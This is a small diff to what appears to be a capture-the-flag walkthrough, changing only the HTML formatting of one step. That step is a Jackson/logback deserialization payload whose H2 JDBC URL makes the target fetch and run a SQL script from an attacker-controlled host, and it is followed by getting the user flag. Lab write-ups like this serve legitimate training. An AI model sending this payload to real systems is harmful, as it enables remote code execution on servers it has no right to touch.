@@ -56,7 +56,7 @@ Then, start your listeners.<br>
 ![image](https://imgur.com/amInJkc.png "Python listener")<br>
 
 Now we can send the payload:
-"["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.197/inject.sql'"}]"<br>
+<p>"["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.197/inject.sql'"}]"</p><br>
 
 And we got the user!
 ![image](https://imgur.com/sramzmY.png "user flag")<br>
